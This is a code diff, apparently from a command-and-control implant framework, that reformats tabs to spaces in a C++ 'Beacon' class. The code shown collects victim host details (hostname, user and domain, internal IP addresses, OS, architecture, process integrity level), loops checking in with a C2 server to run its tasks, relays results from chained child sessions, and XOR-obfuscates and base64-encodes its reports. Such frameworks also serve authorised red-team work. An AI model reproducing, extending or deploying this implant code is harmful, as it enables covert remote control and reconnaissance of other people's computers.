@@ -51,13 +51,13 @@ std::string getInternalIP()
     struct ifaddrs* ifAddrStruct = nullptr;
     getifaddrs(&ifAddrStruct);
 
-	std::string ips = "";
+    std::string ips = "";
     for (struct ifaddrs* ifa = ifAddrStruct; ifa != nullptr; ifa = ifa->ifa_next) 
-	{
+    {
         if (ifa->ifa_addr && ifa->ifa_addr->sa_family == AF_INET) 
-		{
-			if(!ips.empty())
-				ips+="\n";
+        {
+            if(!ips.empty())
+                ips+="\n";
 
             void* tmpAddrPtr = &((struct sockaddr_in*)ifa->ifa_addr)->sin_addr;
             char addressBuffer[INET_ADDRSTRLEN];
@@ -65,17 +65,17 @@ std::string getInternalIP()
 
             // Filter out loopback
             if (std::string(ifa->ifa_name) != "lo")
-			{
-				ips += ifa->ifa_name;
-				ips += ": ";
-				ips += addressBuffer;
-			}
+            {
+                ips += ifa->ifa_name;
+                ips += ": ";
+                ips += addressBuffer;
+            }
         }
     }
     if (ifAddrStruct) 
-		freeifaddrs(ifAddrStruct);
-	
-	return ips;
+        freeifaddrs(ifAddrStruct);
+    
+    return ips;
 }
 
 
@@ -103,14 +103,14 @@ std::string getInternalIP()
     WSADATA wsaData;
     char hostname[256];
 
-	std::string ips = "";
+    std::string ips = "";
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) 
-	{
+    {
         return ips;
     }
 
     if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR) 
-	{
+    {
         WSACleanup();
         return ips;
     }
@@ -121,26 +121,26 @@ std::string getInternalIP()
     hints.ai_protocol = IPPROTO_TCP;
 
     if (getaddrinfo(hostname, nullptr, &hints, &result) != 0) 
-	{
+    {
         WSACleanup();
         return ips;
     }
 
     for (struct addrinfo* ptr = result; ptr != nullptr; ptr = ptr->ai_next) 
-	{
-		if(!ips.empty())
-			ips+="\n";
+    {
+        if(!ips.empty())
+            ips+="\n";
 
         struct sockaddr_in* sockaddr_ipv4 = reinterpret_cast<struct sockaddr_in*>(ptr->ai_addr);
         char ipStr[INET_ADDRSTRLEN];
         inet_ntop(AF_INET, &sockaddr_ipv4->sin_addr, ipStr, sizeof(ipStr));
-		ips += ipStr;
+        ips += ipStr;
     }
 
     freeaddrinfo(result);
     WSACleanup();
 
-	return ips;
+    return ips;
 }
 
 
@@ -152,58 +152,58 @@ int getCurrentPID()
 
 enum IntegrityLevel 
 {
-	INTEGRITY_UNKNOWN,
-	UNTRUSTED_INTEGRITY,
-	LOW_INTEGRITY,
-	MEDIUM_INTEGRITY,
-	HIGH_INTEGRITY,
+    INTEGRITY_UNKNOWN,
+    UNTRUSTED_INTEGRITY,
+    LOW_INTEGRITY,
+    MEDIUM_INTEGRITY,
+    HIGH_INTEGRITY,
 };
 
 
 IntegrityLevel GetCurrentProcessIntegrityLevel() 
 {
-	HANDLE hToken = NULL;
-	BOOL result = false;
-	TOKEN_USER* tokenUser = NULL;
-	DWORD dwLength = 0;
+    HANDLE hToken = NULL;
+    BOOL result = false;
+    TOKEN_USER* tokenUser = NULL;
+    DWORD dwLength = 0;
 
-	OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
+    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
 
-	DWORD token_info_length = 0;
-	if (::GetTokenInformation(hToken, TokenIntegrityLevel,
-		nullptr, 0, &token_info_length) ||
-		::GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
-		return INTEGRITY_UNKNOWN;
-	}
+    DWORD token_info_length = 0;
+    if (::GetTokenInformation(hToken, TokenIntegrityLevel,
+        nullptr, 0, &token_info_length) ||
+        ::GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
+        return INTEGRITY_UNKNOWN;
+    }
 
-	auto token_label_bytes = std::make_unique<char[]>(token_info_length);
-	TOKEN_MANDATORY_LABEL* token_label =
-		reinterpret_cast<TOKEN_MANDATORY_LABEL*>(token_label_bytes.get());
-	if (!::GetTokenInformation(hToken, TokenIntegrityLevel,
-		token_label, token_info_length,
-		&token_info_length)) {
-		return INTEGRITY_UNKNOWN;
-	}
-	DWORD integrity_level = *::GetSidSubAuthority(
-		token_label->Label.Sid,
-		static_cast<DWORD>(*::GetSidSubAuthorityCount(token_label->Label.Sid) -
-			1));
+    auto token_label_bytes = std::make_unique<char[]>(token_info_length);
+    TOKEN_MANDATORY_LABEL* token_label =
+        reinterpret_cast<TOKEN_MANDATORY_LABEL*>(token_label_bytes.get());
+    if (!::GetTokenInformation(hToken, TokenIntegrityLevel,
+        token_label, token_info_length,
+        &token_info_length)) {
+        return INTEGRITY_UNKNOWN;
+    }
+    DWORD integrity_level = *::GetSidSubAuthority(
+        token_label->Label.Sid,
+        static_cast<DWORD>(*::GetSidSubAuthorityCount(token_label->Label.Sid) -
+            1));
 
-	if (integrity_level < SECURITY_MANDATORY_LOW_RID)
-		return UNTRUSTED_INTEGRITY;
+    if (integrity_level < SECURITY_MANDATORY_LOW_RID)
+        return UNTRUSTED_INTEGRITY;
 
-	if (integrity_level < SECURITY_MANDATORY_MEDIUM_RID)
-		return LOW_INTEGRITY;
+    if (integrity_level < SECURITY_MANDATORY_MEDIUM_RID)
+        return LOW_INTEGRITY;
 
-	if (integrity_level >= SECURITY_MANDATORY_MEDIUM_RID &&
-		integrity_level < SECURITY_MANDATORY_HIGH_RID) {
-		return MEDIUM_INTEGRITY;
-	}
+    if (integrity_level >= SECURITY_MANDATORY_MEDIUM_RID &&
+        integrity_level < SECURITY_MANDATORY_HIGH_RID) {
+        return MEDIUM_INTEGRITY;
+    }
 
-	if (integrity_level >= SECURITY_MANDATORY_HIGH_RID)
-		return HIGH_INTEGRITY;
+    if (integrity_level >= SECURITY_MANDATORY_HIGH_RID)
+        return HIGH_INTEGRITY;
 
-	return INTEGRITY_UNKNOWN;
+    return INTEGRITY_UNKNOWN;
 }
 #endif
 
@@ -222,109 +222,109 @@ Beacon::Beacon()
 
 #ifdef __linux__
 
-	char hostname[2048];
-	char username[2048];
-	gethostname(hostname, 2048);
-	getlogin_r(username, 2048);
+    char hostname[2048];
+    char username[2048];
+    gethostname(hostname, 2048);
+    getlogin_r(username, 2048);
 
-	m_hostname = hostname;
-	m_username = username;
+    m_hostname = hostname;
+    m_username = username;
 
-	uid_t uid = geteuid ();
-	struct passwd *pw = getpwuid (uid);
-	if (pw)
-		m_username = std::string(pw->pw_name);
+    uid_t uid = geteuid ();
+    struct passwd *pw = getpwuid (uid);
+    if (pw)
+        m_username = std::string(pw->pw_name);
 
-	struct utsname unameData;
-	uname(&unameData);
+    struct utsname unameData;
+    uname(&unameData);
 
-	m_additionalInfo = unameData.sysname;
-	m_additionalInfo += "\n";
-	m_additionalInfo += unameData.nodename;
-	m_additionalInfo += "\n";
-	m_additionalInfo += unameData.release;
-	m_additionalInfo += "\n";
-	m_additionalInfo += unameData.version;
-	m_additionalInfo += "\n";
-	m_additionalInfo += unameData.machine;
+    m_additionalInfo = unameData.sysname;
+    m_additionalInfo += "\n";
+    m_additionalInfo += unameData.nodename;
+    m_additionalInfo += "\n";
+    m_additionalInfo += unameData.release;
+    m_additionalInfo += "\n";
+    m_additionalInfo += unameData.version;
+    m_additionalInfo += "\n";
+    m_additionalInfo += unameData.machine;
 
-	m_arch = unameData.machine;
+    m_arch = unameData.machine;
 
-	m_privilege = "user";
-	if(m_username=="root")
-		m_privilege = "root";
-	
+    m_privilege = "user";
+    if(m_username=="root")
+        m_privilege = "root";
+    
         m_os = unameData.sysname;
         m_os += " ";
         m_os += unameData.release;
 
 #elif _WIN32
 
-	TCHAR  infoBuf[INFO_BUFFER_SIZE];
-	DWORD  bufCharCount = INFO_BUFFER_SIZE;
+    TCHAR  infoBuf[INFO_BUFFER_SIZE];
+    DWORD  bufCharCount = INFO_BUFFER_SIZE;
 
-	// Get and display the name of the computer.
-	m_hostname = "unknown";
-	if( GetComputerName( infoBuf, &bufCharCount ) )
-		m_hostname = infoBuf;
+    // Get and display the name of the computer.
+    m_hostname = "unknown";
+    if( GetComputerName( infoBuf, &bufCharCount ) )
+        m_hostname = infoBuf;
 
-	std::string username1;
+    std::string username1;
     if( GetUserName( infoBuf, &bufCharCount ) )
-    	username1 = infoBuf;
+        username1 = infoBuf;
 
-	// ??
-	std::string acctName;
-	std::string domainname;
+    // ??
+    std::string acctName;
+    std::string domainname;
 
-	TOKEN_USER tokenUser;
-	ZeroMemory(&tokenUser, sizeof(TOKEN_USER));
-	DWORD tokenUserLength = 0;
+    TOKEN_USER tokenUser;
+    ZeroMemory(&tokenUser, sizeof(TOKEN_USER));
+    DWORD tokenUserLength = 0;
 
-	PTOKEN_USER pTokenUser;
-	GetTokenInformation(GetCurrentProcessToken(), TOKEN_INFORMATION_CLASS::TokenUser, NULL,      
-	0, &tokenUserLength);
-	pTokenUser = (PTOKEN_USER) new BYTE[tokenUserLength];
+    PTOKEN_USER pTokenUser;
+    GetTokenInformation(GetCurrentProcessToken(), TOKEN_INFORMATION_CLASS::TokenUser, NULL,      
+    0, &tokenUserLength);
+    pTokenUser = (PTOKEN_USER) new BYTE[tokenUserLength];
 
-	if (GetTokenInformation(GetCurrentProcessToken(), TOKEN_INFORMATION_CLASS::TokenUser, pTokenUser, tokenUserLength, &tokenUserLength))
-	{
-		TCHAR szUserName[_MAX_PATH];
-		DWORD dwUserNameLength = _MAX_PATH;
-		TCHAR szDomainName[_MAX_PATH];
-		DWORD dwDomainNameLength = _MAX_PATH;
-		SID_NAME_USE sidNameUse;
-		LookupAccountSid(NULL, pTokenUser->User.Sid, szUserName, &dwUserNameLength, szDomainName, &dwDomainNameLength, &sidNameUse);
-		acctName=szUserName;
-		domainname=szDomainName;
-		delete[] pTokenUser;
-	}
+    if (GetTokenInformation(GetCurrentProcessToken(), TOKEN_INFORMATION_CLASS::TokenUser, pTokenUser, tokenUserLength, &tokenUserLength))
+    {
+        TCHAR szUserName[_MAX_PATH];
+        DWORD dwUserNameLength = _MAX_PATH;
+        TCHAR szDomainName[_MAX_PATH];
+        DWORD dwDomainNameLength = _MAX_PATH;
+        SID_NAME_USE sidNameUse;
+        LookupAccountSid(NULL, pTokenUser->User.Sid, szUserName, &dwUserNameLength, szDomainName, &dwDomainNameLength, &sidNameUse);
+        acctName=szUserName;
+        domainname=szDomainName;
+        delete[] pTokenUser;
+    }
 
-	if(!domainname.empty())
-		m_username+=domainname;
-	else if(!m_hostname.empty())
-		m_username+=m_hostname;
-	else 
-		m_username+=".";
+    if(!domainname.empty())
+        m_username+=domainname;
+    else if(!m_hostname.empty())
+        m_username+=m_hostname;
+    else 
+        m_username+=".";
 
-	m_username+="\\";
-	if(!acctName.empty())
-		m_username+=acctName;
-	else if(!username1.empty())
-		m_username+=username1;
-	else 
-		m_username+="unknow";
+    m_username+="\\";
+    if(!acctName.empty())
+        m_username+=acctName;
+    else if(!username1.empty())
+        m_username+=username1;
+    else 
+        m_username+="unknow";
 
-	SYSTEM_INFO systemInfo = { 0 };
-	GetNativeSystemInfo(&systemInfo);
+    SYSTEM_INFO systemInfo = { 0 };
+    GetNativeSystemInfo(&systemInfo);
 
-	m_arch = "x64";
-	if (systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
-		m_arch = "x86";
+    m_arch = "x64";
+    if (systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
+        m_arch = "x86";
 
         m_os = "Windows";
 
-	IntegrityLevel integrityLevel = GetCurrentProcessIntegrityLevel();
+    IntegrityLevel integrityLevel = GetCurrentProcessIntegrityLevel();
 
-	m_privilege = "-";
+    m_privilege = "-";
         if (integrityLevel == INTEGRITY_UNKNOWN)
                 m_privilege = "UNKNOWN";
         else if (integrityLevel == UNTRUSTED_INTEGRITY)
@@ -349,28 +349,28 @@ Beacon::Beacon()
 
 void Beacon::run()
 {
-	bool exit = false;
-	while (!exit)
-	{
-		try 
-		{
-			checkIn();
+    bool exit = false;
+    while (!exit)
+    {
+        try 
+        {
+            checkIn();
 
-			exit = runTasks();
-			
-			sleep();
-		}
-		catch(const std::exception& ex)
-		{
-			sleep();
-		}
-		catch (...) 
-		{
-			sleep();
-		}
-	}
+            exit = runTasks();
+            
+            sleep();
+        }
+        catch(const std::exception& ex)
+        {
+            sleep();
+        }
+        catch (...) 
+        {
+            sleep();
+        }
+    }
 
-	checkIn();
+    checkIn();
 }
 
 
@@ -466,71 +466,71 @@ bool Beacon::cmdToTasks(const std::string& input)
 // Create the response message from the results of all the commmands send to this beacon and child beacons
 bool Beacon::taskResultsToCmd(std::string& output)
 {
-	// Handle results of commands address to this particular Beacon
-	MultiBundleC2Message multiBundleC2Message;
-	BundleC2Message *bundleC2Message = multiBundleC2Message.add_bundlec2messages();
+    // Handle results of commands address to this particular Beacon
+    MultiBundleC2Message multiBundleC2Message;
+    BundleC2Message *bundleC2Message = multiBundleC2Message.add_bundlec2messages();
 
-	// TODO check of m_taskResult contain a getInfo cmd and add context info if it does
-	bundleC2Message->set_beaconhash(m_beaconHash);
-	bundleC2Message->set_hostname(m_hostname);
-	bundleC2Message->set_username(m_username);
-	bundleC2Message->set_arch(m_arch);
-	bundleC2Message->set_privilege(m_privilege);
-	bundleC2Message->set_os(m_os);
-	bundleC2Message->set_lastProofOfLife("0");
-	bundleC2Message->set_internalIps(m_ips);
-	bundleC2Message->set_processId(m_pid);
-	bundleC2Message->set_additionalInformation(m_additionalInfo);
+    // TODO check of m_taskResult contain a getInfo cmd and add context info if it does
+    bundleC2Message->set_beaconhash(m_beaconHash);
+    bundleC2Message->set_hostname(m_hostname);
+    bundleC2Message->set_username(m_username);
+    bundleC2Message->set_arch(m_arch);
+    bundleC2Message->set_privilege(m_privilege);
+    bundleC2Message->set_os(m_os);
+    bundleC2Message->set_lastProofOfLife("0");
+    bundleC2Message->set_internalIps(m_ips);
+    bundleC2Message->set_processId(m_pid);
+    bundleC2Message->set_additionalInformation(m_additionalInfo);
 
-	while(!m_taskResult.empty())
-	{
-		C2Message c2MessageRet=m_taskResult.front();
-		// C2Message *addedC2MessageRet = bundleC2Message->add_c2messages();
-		// addedC2MessageRet->CopyFrom(c2MessageRet);
-		bundleC2Message->add_c2messages(c2MessageRet);
-		m_taskResult.pop();
-	}
+    while(!m_taskResult.empty())
+    {
+        C2Message c2MessageRet=m_taskResult.front();
+        // C2Message *addedC2MessageRet = bundleC2Message->add_c2messages();
+        // addedC2MessageRet->CopyFrom(c2MessageRet);
+        bundleC2Message->add_c2messages(c2MessageRet);
+        m_taskResult.pop();
+    }
 
-	// Handle results of commands address to child sessions
+    // Handle results of commands address to child sessions
         for(int i=0; i<m_listeners.size(); i++)
         {
                 for(std::size_t j=0; j<m_listeners[i]->getNumberOfSession(); j++)
-		{
-			std::shared_ptr<Session> ptr = m_listeners[i]->getSessionPtr(j);
+        {
+            std::shared_ptr<Session> ptr = m_listeners[i]->getSessionPtr(j);
 
-			BundleC2Message *bundleC2Message = multiBundleC2Message.add_bundlec2messages();
-			
-			// TODO check of m_taskResult contain a getInfo cmd and add context info if it does
-			bundleC2Message->set_beaconhash(ptr->getBeaconHash());
-			bundleC2Message->set_listenerhash(ptr->getListenerHash());
-			bundleC2Message->set_hostname(ptr->getHostname());
-			bundleC2Message->set_username(ptr->getUsername());
-			bundleC2Message->set_arch(ptr->getArch());
-			bundleC2Message->set_privilege(ptr->getPrivilege());
-			bundleC2Message->set_os(ptr->getOs());
-			bundleC2Message->set_lastProofOfLife(ptr->getLastProofOfLife());
-			bundleC2Message->set_internalIps(ptr->getInternalIps());
-			bundleC2Message->set_processId(ptr->getProcessId());
-			bundleC2Message->set_additionalInformation(ptr->getAdditionalInformation());
+            BundleC2Message *bundleC2Message = multiBundleC2Message.add_bundlec2messages();
+            
+            // TODO check of m_taskResult contain a getInfo cmd and add context info if it does
+            bundleC2Message->set_beaconhash(ptr->getBeaconHash());
+            bundleC2Message->set_listenerhash(ptr->getListenerHash());
+            bundleC2Message->set_hostname(ptr->getHostname());
+            bundleC2Message->set_username(ptr->getUsername());
+            bundleC2Message->set_arch(ptr->getArch());
+            bundleC2Message->set_privilege(ptr->getPrivilege());
+            bundleC2Message->set_os(ptr->getOs());
+            bundleC2Message->set_lastProofOfLife(ptr->getLastProofOfLife());
+            bundleC2Message->set_internalIps(ptr->getInternalIps());
+            bundleC2Message->set_processId(ptr->getProcessId());
+            bundleC2Message->set_additionalInformation(ptr->getAdditionalInformation());
 
-			C2Message c2Message = ptr->getTaskResult();
-			while(!c2Message.instruction().empty())
-			{
-				// C2Message *addedC2MessageRet = bundleC2Message->add_c2messages();
-				// addedC2MessageRet->CopyFrom(c2Message);
-				bundleC2Message->add_c2messages(c2Message);
-				c2Message = ptr->getTaskResult();
-			}
-		}
-	}
+            C2Message c2Message = ptr->getTaskResult();
+            while(!c2Message.instruction().empty())
+            {
+                // C2Message *addedC2MessageRet = bundleC2Message->add_c2messages();
+                // addedC2MessageRet->CopyFrom(c2Message);
+                bundleC2Message->add_c2messages(c2Message);
+                c2Message = ptr->getTaskResult();
+            }
+        }
+    }
 
-	std::string data;
-	multiBundleC2Message.SerializeToString(&data);
+    std::string data;
+    multiBundleC2Message.SerializeToString(&data);
 
-	XOR(data, m_key);
-	output = base64_encode(data);
+    XOR(data, m_key);
+    output = base64_encode(data);
 
-	return true;
+    return true;
 }
 
 
@@ -538,53 +538,53 @@ bool Beacon::taskResultsToCmd(std::string& output)
 // Returns true if an instruction indicates the beacon should exit, otherwise false.
 bool Beacon::runTasks()
 {
-	// Execute all recurring module commands and collect their results.
-	for (auto it = m_moduleCmd.begin(); it != m_moduleCmd.end(); ++it)
-	{
-		C2Message c2RetMessage;
-		int result = (*it)->recurringExec(c2RetMessage);
+    // Execute all recurring module commands and collect their results.
+    for (auto it = m_moduleCmd.begin(); it != m_moduleCmd.end(); ++it)
+    {
+        C2Message c2RetMessage;
+        int result = (*it)->recurringExec(c2RetMessage);
 
-		// If the module executed successfully, store the result for response construction.
-		if (result)
-			m_taskResult.push(c2RetMessage);
-	}
+        // If the module executed successfully, store the result for response construction.
+        if (result)
+            m_taskResult.push(c2RetMessage);
+    }
 
-	// Process each individual task assigned to this beacon.
-	// These are one-time commands sent from the C2 server.
-	while (!m_tasks.empty())
-	{
-		C2Message c2Message = m_tasks.front();
-		m_tasks.pop();
+    // Process each individual task assigned to this beacon.
+    // These are one-time commands sent from the C2 server.
+    while (!m_tasks.empty())
+    {
+        C2Message c2Message = m_tasks.front();
+        m_tasks.pop();
 
-		C2Message c2RetMessage;
-		
-		// Execute the instruction and generate the response.
-		bool exit = execInstruction(c2Message, c2RetMessage);
+        C2Message c2RetMessage;
+        
+        // Execute the instruction and generate the response.
+        bool exit = execInstruction(c2Message, c2RetMessage);
 
-		// Store the result of the execution.
-		m_taskResult.push(std::move(c2RetMessage));
+        // Store the result of the execution.
+        m_taskResult.push(std::move(c2RetMessage));
 
-		// If the instruction indicates the beacon should exit, return immediately.
-		if (exit)
-			return exit;
-	}
+        // If the instruction indicates the beacon should exit, return immediately.
+        if (exit)
+            return exit;
+    }
 
-	// Add a heartbeat or "proof-of-life" message for each active listener.
-	// This helps the C2 track which listeners are still alive and their current state.
-	for (int i = 0; i < m_listeners.size(); i++)
-	{
-		C2Message listenerProofOfLife;
+    // Add a heartbeat or "proof-of-life" message for each active listener.
+    // This helps the C2 track which listeners are still alive and their current state.
+    for (int i = 0; i < m_listeners.size(); i++)
+    {
+        C2Message listenerProofOfLife;
 
-		listenerProofOfLife.set_instruction(ListenerPollCmd);                            // Indicate this is a poll/proof message.
-		listenerProofOfLife.set_data(m_listeners[i]->getListenerHash());                // Include unique listener identifier.
-		listenerProofOfLife.set_returnvalue(m_listeners[i]->getListenerMetadata());     // Include listener status/metadata.
+        listenerProofOfLife.set_instruction(ListenerPollCmd);                            // Indicate this is a poll/proof message.
+        listenerProofOfLife.set_data(m_listeners[i]->getListenerHash());                // Include unique listener identifier.
+        listenerProofOfLife.set_returnvalue(m_listeners[i]->getListenerMetadata());     // Include listener status/metadata.
 
-		// Add the heartbeat to the response queue.
-		m_taskResult.push(listenerProofOfLife);
-	}
+        // Add the heartbeat to the response queue.
+        m_taskResult.push(listenerProofOfLife);
+    }
 
-	// No exit signal was received; continue beacon execution.
-	return false;
+    // No exit signal was received; continue beacon execution.
+    return false;
 }
 
 
